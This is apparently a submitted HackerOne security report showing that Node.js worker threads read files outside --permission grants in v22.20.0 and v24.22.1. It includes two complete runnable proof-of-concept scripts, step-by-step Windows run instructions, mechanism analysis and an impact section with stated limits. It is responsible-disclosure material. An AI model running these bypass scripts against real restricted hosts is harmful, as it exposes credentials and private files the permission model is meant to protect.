# HackerOne report as submitted — #4142193

**Report:** "Worker threads bypass --permission read restrictions in Node.js v22.20.0 and v24.22.1"
**Reporter:** Shubham Bhasker (HackerOne: dracarysroxxx, GitHub: 0xDracarys)
**Submitted:** 2026-10-24 on HackerOne
**Outcome:** closed the same day, 15:43 CEST, as Informative — on Signal grounds only, never triaged on merits. See `HACKERONE-OUTCOME.md`.

This file is the report text as submitted, in HackerOne field order (Summary, Description, Steps To Reproduce, Documentation Review, Supporting Material/References, Impact).

`HACKERONE-REPORT.md` in this repo is the earlier pre-submission draft, written as a field-by-field paste guide. This file is the submitted version.

**Important note on the PoC code below:** the copy Sam pasted in chat had lost its backticks and template literals, so the code as pasted would not run. The code blocks in this file are restored verbatim from the authoritative, verified files in this repo — `lab/worker-read-poc.js` and `lab/worker-boundary-poc.js`. Those two files are the runnable proofs. Do not copy PoC code from a chat paste.

## Summary

A worker thread created by a --permission-restricted process can read any file on the filesystem, even though the main thread is correctly denied the same file and even though write and child-process scopes inside the same worker are correctly denied. The worker's own process.permission.has('fs.read', <path>) returns true for ungranted paths. The private value does not just get read — it crosses the boundary intact into a granted folder (verified end-to-end). Affects released Node.js v22.20.0 and v24.22.1 (Windows; mechanism is platform-independent code).

## Description

When Node.js runs with --permission, enforce mode promises that access is denied with ERR_ACCESS_DENIED for any operation the process has not been granted. On the main thread that promise holds: reading a file outside the granted folders is denied. A worker thread created by that same restricted process (with --allow-worker, which is required to create workers at all under the model) does not enforce the read grants:

- Default worker (no execArgv): reads ungranted files.
- Worker with execArgv explicitly re-listing --permission and every grant: still reads ungranted files.
- Worker with execArgv: []: still reads ungranted files.

Read doors that all work inside the worker: fs.readFileSync, fs.promises.readFile, fs.statSync, fs.readdirSync, fs.realpathSync.

Inside the worker, process.permission.has('fs.read', <ungranted path>) returns true, and has('fs.read', '*') returns true.

In the SAME worker, fs.writeFileSync to an ungranted path is denied, and child_process spawn is denied, while writes to granted folders succeed. So the worker's permission state is half-enforced, not absent: write/child scopes sit deny-all, the read scope answers yes to everything.

Mechanism (from the released source, main branch, for triage): src/permission/fs_permission.h defaults both deny-all flags to true, and grants are applied per-Environment in src/env.cc. is_tree_granted() calls RadixTree::Lookup(path, true), so an empty grant tree returns true for every path. The observed worker state matches a permission object whose read side was switched on without any grants being applied, while write and child stayed deny-by-default. The exact worker-bootstrap line that flips the read side is left for the maintainers to pin down; the observed behavior is fully reproducible.

Controls that prove the test setup is honest (same runs, same grants): main-thread read of the private file is denied; hardlink creation from a private file into a granted folder is denied; fs.watch and fs.watchFile on the private file are denied; worker creation without --allow-worker is denied.

## Steps To Reproduce

### Part A — install Node.js and check it

1. If Node.js is not installed, download released version 22.20.0 or 24.22.1 from nodejs.org and install it by clicking through the installer with the default options. Both versions were tested and both show the bug. If Node.js is already installed, you can skip the download, but check the version first.
2. Open Command Prompt: press the Windows key, type cmd, and press Enter. A black window opens.
3. Check the version by typing this command exactly, then pressing Enter: `node --version`. It should print v22.20.0 or v24.22.1. If it prints something else, install one of those two versions first, because other versions were not tested here.

### Part B — make a folder and save the test file

4. Make a new empty folder for the test. In File Explorer, go to C:, right-click in an empty space, choose New, then Folder, and name it node-test. So the full folder is `C:\node-test`.
5. Go into that folder in Command Prompt by typing this command exactly, then pressing Enter: `cd /d C:\node-test`. The cd command means "change directory", so now everything you type runs inside that folder.
6. Open Notepad: press the Windows key, type Notepad, and press Enter. Copy the whole code block below, from the first line ('use strict';) to the very last line, and paste it into Notepad. Do not change anything inside it.
7. Save it correctly, because this step is where most people go wrong. In Notepad, click File, then Save As. In the file name box type exactly: `worker-read-poc.js`. Next to it there is a box called "Save as type": change it from Text Documents to All Files. Then click Save. If you skip the All Files step, Windows will save it as `worker-read-poc.js.txt`, and the test will not run. To check, look in `C:\node-test` in File Explorer: you must see a file named `worker-read-poc.js`, not `worker-read-poc.js.txt`.

The code to save as `worker-read-poc.js` (also in this repo at `lab/worker-read-poc.js`):

```js
'use strict';
/*
 * ONE-FILE PoC — Node.js Permission Model: worker-thread read escape.
 *
 * Usage (run the PARENT once per Node version):
 *   node worker-read-poc.js
 *
 * The script builds a FRESH fixture (poc-clean/allowed + poc-clean/secret
 * with a fresh random witness), writes a worker script and a child
 * script into the allowed folder, then spawns ONE restricted child:
 *   node --permission --allow-fs-read=<allowed> --allow-worker child.js
 * The child (a) tries to read the secret on the main thread (control —
 * must be DENIED), then (b) spawns a worker that reads the same file.
 *
 * Expected output on affected versions (22.20.0, 24.22.1):
 *   MAIN-DENIED ERR_ACCESS_DENIED
 *   WORKER-READ <witness>
 */
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const BASE = path.join(__dirname, 'poc-clean');
const ALLOWED = path.join(BASE, 'allowed');
const SECRET_DIR = path.join(BASE, 'secret');
const SECRET = path.join(SECRET_DIR, 'SECRET.txt');
const WORKER_FILE = path.join(ALLOWED, 'worker.js');

// Fresh fixture + restricted child.
fs.rmSync(BASE, { recursive: true, force: true });
fs.mkdirSync(ALLOWED, { recursive: true });
fs.mkdirSync(SECRET_DIR, { recursive: true });
const witness = 'POC-WITNESS-' + Date.now().toString(36);
fs.writeFileSync(SECRET, witness + '\n');
fs.writeFileSync(path.join(ALLOWED, 'hello.txt'), 'hello inside\n');
fs.writeFileSync(WORKER_FILE, `
  const fs = require('fs');
  const { parentPort, workerData } = require('worker_threads');
  try { parentPort.postMessage(fs.readFileSync(workerData, 'utf8').trim()); }
  catch (e) { parentPort.postMessage('DENIED ' + (e.code || e.message)); }
`);
const childCode = `
  const fs = require('fs');
  const { Worker } = require('worker_threads');
  try { fs.readFileSync(${JSON.stringify(SECRET)}, 'utf8');
    console.log('MAIN-READ-UNEXPECTED'); }
  catch (e) { console.log('MAIN-DENIED ' + (e.code || e.message)); }
  const w = new Worker(${JSON.stringify(WORKER_FILE)}, { workerData: ${JSON.stringify(SECRET)} });
  w.on('message', (m) => console.log('WORKER-READ ' + m));
  w.on('error', (e) => console.log('WORKER-ERROR ' + (e.code || e.message)));
`;
const childFile = path.join(ALLOWED, 'child.js');
fs.writeFileSync(childFile, childCode);
const r = spawnSync(process.execPath, [
  '--permission',
  '--allow-fs-read=' + ALLOWED,
  '--allow-worker',
  childFile,
], { encoding: 'utf8', timeout: 30000 });
console.log('node:', process.version);
console.log('witness:', witness);
console.log((r.stdout || '').trim());
if (r.stderr) console.log('stderr:', r.stderr.split('\n')[0].slice(0, 120));
```

### Part C — what the code does, in plain words, so you can follow it without guessing

8. The first three lines load Node's own built-in tools: fs means "file system" (reading and writing files), path means "folder paths", and child_process means "run another program". Nothing is downloaded and no outside library is used.
9. The next lines name the folders: poc-clean is the test folder the script creates by itself, allowed is the folder the locked program may read, secret is the folder it must never read, and SECRET.txt is the secret file inside the secret folder.
10. The script then deletes any old test folder, makes the two folders fresh, and writes a brand-new secret word into SECRET.txt. The secret word is built from the current time, so it is different on every single run. That matters: a matching result can never be a leftover from an earlier run.
11. The script writes two small helper programs into the allowed folder. The first is the worker: all it does is read the secret file and send the contents back. The second is the child: first it tries to read the secret file itself, then it starts the worker and prints whatever the worker sends back.
12. Finally, the script runs the child program with the lock switched on: --permission means the lock is on, --allow-fs-read plus the allowed folder means the child may read only that folder, and --allow-worker means the child is allowed to start workers. Then it prints everything the child printed.

### Part D — run it and read the result

13. In Command Prompt, making sure you are still inside `C:\node-test`, type this command exactly, then press Enter: `node worker-read-poc.js`
14. Read the output line by line. First line: the Node version, for example `node: v22.20.0`. Second line: the fresh secret word, for example `witness: POC-WITNESS-abc123`. Third line: `MAIN-DENIED ERR_ACCESS_DENIED`. This is the control, and it must say DENIED: it proves the locked main program cannot read the secret file, so the lock works on the main program. Fourth line: `WORKER-READ POC-WITNESS-abc123`, with the exact same secret word as line two. This is the bug: the helper thread created by that same locked program read the secret file that the main program could not read.
15. Run the same command a second time, or run it with the other Node version. You will get a new secret word each time, and the worker line will match it exactly every time. If you ever see MAIN-READ-UNEXPECTED instead of MAIN-DENIED, stop: that means the lock itself is not working on your machine, and the test setup is wrong. If you see WORKER-READ DENIED, that version is not affected.

### Part E — escalation check, proving the secret actually escapes (same save-and-run pattern, second file)

16. Repeat steps 6 and 7, but save this second code block as `worker-boundary-poc.js`, again using Save As with All Files. This file cuts a test value in half and locks both halves in a private folder, so the full value only exists if both halves are read and put back together. The worker reads both halves, combines them, writes the full value into the allowed folder by itself, and the main program also writes it there from what the worker sent back.
17. Run it with this command: `node worker-boundary-poc.js`. Read the output: you will see MAIN-DENIED again, then WORKER-COMBINED with the full value, then WORKER-DIRECT-WRITE OK, then two check lines that say `VERIFY output.txt match=true` and `VERIFY worker-output.txt match=true`. Those two check lines are verified from outside the locked program, and they mean the locked-away value now sits complete in the allowed folder, where it can be used. This proves the secret actually escapes, not just that a read works.

The code to save as `worker-boundary-poc.js` (also in this repo at `lab/worker-boundary-poc.js`):

```js
'use strict';
/*
 * Boundary-crossing check — Node.js Permission Model, worker threads.
 *
 * Usage: node worker-boundary-poc.js
 *
 * Parent builds a fresh fixture: esc-clean/allowed and esc-clean/private.
 * The private folder holds a test value split across two files; the
 * combined value only exists if both files are read.
 * A restricted child (read on allowed only, plus worker use) then:
 *  (a) tries to read a private file on the main thread (control),
 *  (b) asks a worker to read both private files and combine them,
 *  (c) writes the combined value to allowed/output.txt,
 *  (d) the worker also tries writing allowed/worker-output.txt itself.
 * The unrestricted parent then reads the allowed folder and checks
 * whether the combined value arrived there intact.
 */
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const BASE = path.join(__dirname, 'esc-clean');
const ALLOWED = path.join(BASE, 'allowed');
const PRIVATE = path.join(BASE, 'private');
const PART_A = path.join(PRIVATE, 'part-a.txt');
const PART_B = path.join(PRIVATE, 'part-b.txt');

fs.rmSync(BASE, { recursive: true, force: true });
fs.mkdirSync(ALLOWED, { recursive: true });
fs.mkdirSync(PRIVATE, { recursive: true });
const suffix = Date.now().toString(36);
const partA = 'BOUNDARY-TEST-A-';
const partB = 'BOUNDARY-TEST-B-' + suffix;
const expected = partA + partB;
fs.writeFileSync(PART_A, partA);
fs.writeFileSync(PART_B, partB);

const workerFile = path.join(ALLOWED, 'worker.js');
fs.writeFileSync(workerFile, `
  const fs = require('fs');
  const { parentPort, workerData } = require('worker_threads');
  const out = {};
  try { out.a = fs.readFileSync(workerData.a, 'utf8'); }
  catch (e) { out.a = 'DENIED ' + (e.code || e.message); }
  try { out.b = fs.readFileSync(workerData.b, 'utf8'); }
  catch (e) { out.b = 'DENIED ' + (e.code || e.message); }
  try { fs.writeFileSync(workerData.out, out.a + out.b);
    out.directWrite = 'OK'; }
  catch (e) { out.directWrite = 'DENIED ' + (e.code || e.message); }
  parentPort.postMessage(JSON.stringify(out));
`);

const childFile = path.join(ALLOWED, 'child.js');
fs.writeFileSync(childFile, `
  const fs = require('fs');
  const { Worker } = require('worker_threads');
  try { fs.readFileSync(${JSON.stringify(PART_A)}, 'utf8');
    console.log('MAIN-READ-UNEXPECTED'); }
  catch (e) { console.log('MAIN-DENIED ' + (e.code || e.message)); }
  const w = new Worker(${JSON.stringify(workerFile)}, { workerData: {
    a: ${JSON.stringify(PART_A)},
    b: ${JSON.stringify(PART_B)},
    out: ${JSON.stringify(path.join(ALLOWED, 'worker-output.txt'))},
  } });
  w.on('message', (m) => {
    const o = JSON.parse(m);
    console.log('WORKER-COMBINED ' + (o.a + o.b));
    console.log('WORKER-DIRECT-WRITE ' + o.directWrite);
    try { fs.writeFileSync(${JSON.stringify(path.join(ALLOWED, 'output.txt'))}, o.a + o.b);
      console.log('MAIN-WRITE-ALLOWED OK'); }
    catch (e) { console.log('MAIN-WRITE-ALLOWED DENIED ' + (e.code || e.message)); }
  });
  w.on('error', (e) => console.log('WORKER-ERROR ' + (e.code || e.message)));
`);

const r = spawnSync(process.execPath, [
  '--permission',
  '--allow-fs-read=' + ALLOWED,
  '--allow-fs-write=' + ALLOWED,
  '--allow-worker',
  childFile,
], { encoding: 'utf8', timeout: 30000 });
console.log('node:', process.version);
console.log('expected:', expected);
console.log((r.stdout || '').trim());
if (r.stderr) console.log('stderr:', r.stderr.split('\n')[0].slice(0, 120));

// Unrestricted parent verification: what actually landed in allowed?
for (const f of ['output.txt', 'worker-output.txt']) {
  const p = path.join(ALLOWED, f);
  const got = fs.existsSync(p) ? fs.readFileSync(p, 'utf8') : '(missing)';
  console.log('VERIFY ' + f + ' match=' + (got === expected) + ' value=' + got);
}
```

### Part F — clean up

18. Clean up (optional). Delete the folders the tests created inside your test folder, named poc-clean and esc-clean, and delete the two test files if you want. Nothing else on your computer was touched.

## Documentation Review

I have reviewed the relevant API documentation in doc/api/permissions.md (section "Permission Model constraints"), the SECURITY.md threat model and vulnerability criteria, and the common false positives (permissions.md limitations, wasi.md, cli.md inspector warning).

How this conflicts with documented guarantees, despite the documentation (stated openly, not hidden): Released v24 docs say, in one line, "The model does not inherit to a worker thread." That line alone would suggest this is expected. It does NOT describe the observed state: a worker that HAS a permission object, enforces write and child scopes, and reports fs.read as granted for arbitrary paths. "Does not inherit" predicts no model in the worker, not a half-enforced one. The current main-branch permissions.md expands the same section: a default worker "still receives the parent process CLI flags, including --permission and --allow-*", and a worker with explicit execArgv "does not keep the parent's Permission Model grants unless those flags are listed again in execArgv. That difference is intended, not a bypass." Under that text, the explicit-flags variant in this report — where the flags ARE listed again and reads still succeed — contradicts the documented behavior. SECURITY.md defines a vulnerability as including "Disclosure or loss of confidentiality of data protected through the correct use of Node.js APIs", and defines a "Security-interest bug" as a real defect "that should still be reported privately first when they affect a common security control such as... permission enforcement." This report is filed privately on that basis, at minimum.

False positives ruled out: this is not the documented symlink limitation (no symlinks are used anywhere in the proof files); no WASI, no inspector, and no native addons are used; no non-open-source tool is used — reproduction needs only Node.js itself.

## Supporting Material / References

Attached files:

- worker-read-poc.js (minimum proof)
- worker-boundary-poc.js (escalation proof)

Full hunt write-up, harnesses, and graded results:

- https://github.com/0xDracarys/node-testing
- docs/RESULTS-CORNER5.md
- docs/RESULTS-ESCALATION.md
- docs/RESULTS-CORNER4.md
- docs/RESULTS-CORNER2.md
- docs/RESULTS-RUN1.md
- Note: the two proof files are attached to the HackerOne report and are authoritative. The copies in this repo (`lab/worker-read-poc.js`, `lab/worker-boundary-poc.js`) are the same verified files.

Node.js documentation:

- doc/api/permissions.md ("Permission Model constraints", "File System Permissions", "Enforce mode")
- SECURITY.md: threat model, triage dispositions ("Security-interest bug"), "What constitutes a vulnerability"

Precedent:

- CVE-2025-23083, worker permission bypass via InternalWorker leak in diagnostics, rated High, affecting Permission Model users on v20, v22, and v23.

Related recent fixes (showing the team treats permission enforcement inconsistencies as security fixes):

- 2026 releases fixing a skipped file-path check
- 2026 releases fixing diagnostic features writing outside --allow-fs-write paths

Affected versions confirmed:

- Node.js v22.20.0, v24.22.1 (Windows lab; mechanism in platform-independent code)

## Impact

A program running under --permission with --allow-worker — for example a host running plugin or dependency code with a narrow read grant — can have files outside its grant read by a worker it creates, and the values placed into a granted folder where they are reachable. Concretely, configuration, credentials, or other files readable by the operating system user but outside the grant become readable through the worker, and the worker's own permission checker misreports those reads as granted, so application-level permission.has() guards do not catch it.

Honest scope limits (stated so triage can weigh this fairly): The Permission Model is documented as a seat belt for trusted code, not a sandbox against malicious code. This report does NOT claim a sandbox escape. Exploitation requires the restricted process to be started with --allow-worker (worker creation is otherwise denied) and code execution inside that process that can create a worker. No write outside granted folders and no child-process spawn from the worker were achieved; the demonstrated impact is read-side disclosure plus placement into granted folders. Confirmed on v22.20.0 and v24.22.1 only; other supported lines sharing the same worker initialization are likely affected but were not tested here. Suggested severity is Medium for these reasons. If the team judges this a security-interest bug rather than a vulnerability, that is still a useful outcome for this report.
